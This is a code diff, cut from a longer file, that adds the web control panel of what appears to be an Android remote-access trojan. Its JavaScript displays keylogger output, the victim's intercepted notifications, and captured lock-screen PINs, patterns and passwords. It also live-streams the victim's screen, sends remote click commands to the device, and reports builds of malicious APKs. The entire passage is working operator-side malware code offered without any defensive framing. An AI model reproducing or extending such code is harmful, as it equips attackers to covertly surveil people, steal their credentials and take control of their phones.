+  var list=document.getElementById('keylog-list');if(!list)return;
+  if(list.innerHTML.includes('Waiting'))list.innerHTML='';
+  var d=document.createElement('div');d.className='log-entry-item';
+  d.innerHTML='<div class="log-entry-header"><span class="log-app-name">'+(data.app||'')+'</span><span class="log-time-stamp">'+(data.time||'')+'</span></div><div class="log-content keylog-data">'+(data.data||'')+'</div>';
+  list.prepend(d);
+}
+// NOTIFICATIONS
+function appendNotification(data){
+  var list=document.getElementById('notification-list');if(!list)return;
+  if(list.innerHTML.includes('Waiting'))list.innerHTML='';
+  var d=document.createElement('div');d.className='log-entry-item';
+  d.innerHTML='<div class="log-entry-header"><span class="log-app-name">'+(data.app||'')+'</span><span class="log-time-stamp">'+(data.time||'')+'</span></div><div class="log-content"><strong>'+(data.title||'')+'</strong><br>'+(data.content||'')+'</div>';
+  list.prepend(d);
+}
+// LOCK CREDENTIALS
+function showCapturedLock(data){
+  var container=document.getElementById('credential-log');var list=document.getElementById('captured-creds-list');
+  if(!container||!list){showToast('🔓 Credential Captured!');return}
+  container.style.display='block';
+  var d=document.createElement('div');d.style.padding='4px 0';d.style.borderBottom='1px solid rgba(255,255,255,0.04)';
+  var h='<span style="color:var(--text-muted);font-size:8px">'+new Date().toLocaleTimeString()+'</span><br>';
+  if(data.pin)h+='<span style="color:var(--red-bright);font-family:var(--font-mono);font-size:13px">PIN: '+data.pin+'</span><br>';
+  if(data.pattern)h+='<span style="color:var(--red-bright);font-family:var(--font-mono);font-size:13px">Pattern: '+data.pattern+'</span><br>';
+  if(data.password)h+='<span style="color:var(--red-bright);font-family:var(--font-mono);font-size:13px">Password: '+data.password+'</span><br>';
+  d.innerHTML=h;list.prepend(d);showToast('🔓 Lock Credential Captured!');
+}
+// SCREEN
+function toggleScreenShare(){
+  if(isScreenStreaming){isScreenStreaming=false;sendOrder('screen_capture',{action:'stop'});document.getElementById('screen-placeholder').style.display='block';document.getElementById('screen-canvas').style.display='none'}
+  else{isScreenStreaming=true;sendOrder('screen_capture',{action:'start'});document.getElementById('screen-placeholder').textContent='🖥 Streaming...'}
+}
+function renderScreenFrame(data){
+  if(!isScreenStreaming||!data||!data.frame)return;
+  var canvas=document.getElementById('screen-canvas');var ph=document.getElementById('screen-placeholder');
+  if(!canvas)return;
+  canvas.style.display='block';if(ph)ph.style.display='none';
+  var img=new Image();img.onload=function(){canvas.width=img.width;canvas.height=img.height;var ctx=canvas.getContext('2d');ctx.drawImage(img,0,0,canvas.width,canvas.height)};
+  img.src='data:image/jpeg;base64,'+data.frame;
+}
+// SCREEN READER
+function toggleScreenReader(){
+  isScreenReading=!isScreenReading;sendOrder('screen_reader',{action:isScreenReading?'start':'stop'});
+}
+function renderReaderFrame(data){
+  var container=document.getElementById('reader-container');if(!container||!data||!data.nodes)return;
+  container.innerHTML=data.nodes.map(function(n){return '<div class="reader-node'+(n.clickable?' clickable':'')+'" style="left:'+(n.x||0)+'px;top:'+(n.y||0)+'px;width:'+(n.w||50)+'px;height:'+(n.h||30)+'px'+(n.clickable?' onclick="sendOrder(\'screen_input\',{action:\'reader_click\',x:'+(n.cx||0)+',y:'+(n.cy||0)+'})"':'')+'">'+(n.text||'')+'</div>'}).join('');
+}
+
+// TOAST
+var _toastTimer=null;
+function showToast(msg,duration){
+  duration=duration||2000;
+  var t=document.getElementById('thor-toast');if(!t)return;
+  t.textContent='';t.appendChild(document.createTextNode(msg));
+  t.classList.add('show');if(_toastTimer)clearTimeout(_toastTimer);
+  _toastTimer=setTimeout(function(){t.classList.remove('show')},duration);
+}
+
+// CONNECTION
+socket.on('connect',function(){showToast('⚡ Connected',1000)});
+socket.on('disconnect',function(){showToast('⚠️ Disconnected')});
+
+// BUILD EVENTS
+socket.on('build_log',function(d){showToast('Build: '+(d||''),2000)});
+socket.on('build_success',function(f){showToast('✅ APK: '+f,3000)});
+
+// Expose for parent
+window.currentTargetId = function(){return currentTargetId};
+window.socket = socket;
+
+}catch(e){console.error('CLIENTS INIT ERROR:',e);document.body.innerHTML='<div style="color:red;padding:20px;font-family:monospace;font-size:12px;">CLIENTS ERROR: '+e.message+'</div>'}
+</script>
+</body>
+</html>
